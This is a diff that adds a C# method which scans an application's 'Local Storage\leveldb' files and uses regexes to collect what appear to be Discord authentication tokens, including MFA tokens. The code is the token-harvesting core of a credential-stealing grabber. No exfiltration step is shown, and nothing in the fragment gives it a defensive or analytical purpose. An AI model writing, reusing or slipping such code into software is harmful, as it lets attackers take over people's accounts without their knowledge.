@@ -1,0 +1,38 @@
+public static List<string> FindTokens(string path)
+{
+	List<string> list = new List<string>();
+	foreach (string text in Directory.GetFiles(path + "\\Local Storage\\leveldb"))
+	{
+		bool flag = text.EndsWith(".log") || text.EndsWith(".ldb");
+		if (flag)
+		{
+			try
+			{
+				string text2 = text + "-c";
+				bool flag2 = File.Exists(text2);
+				if (flag2)
+				{
+					File.Delete(text2);
+				}
+				File.Copy(text, text2);
+				string input = File.ReadAllText(text2);
+				foreach (object obj in Regex.Matches(input, "mfa\\.(\\w|\\d|_|-){84}"))
+				{
+					Match match = (Match)obj;
+					list.Add(match.Value);
+				}
+				foreach (object obj2 in Regex.Matches(input, "(\\w|\\d){24}\\.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}"))
+				{
+					Match match2 = (Match)obj2;
+					list.Add(match2.Value);
+				}
+			}
+			catch
+			{
+			}
+		}
+	}
+	return list.Distinct<string>().ToList<string>();
+}
+
+
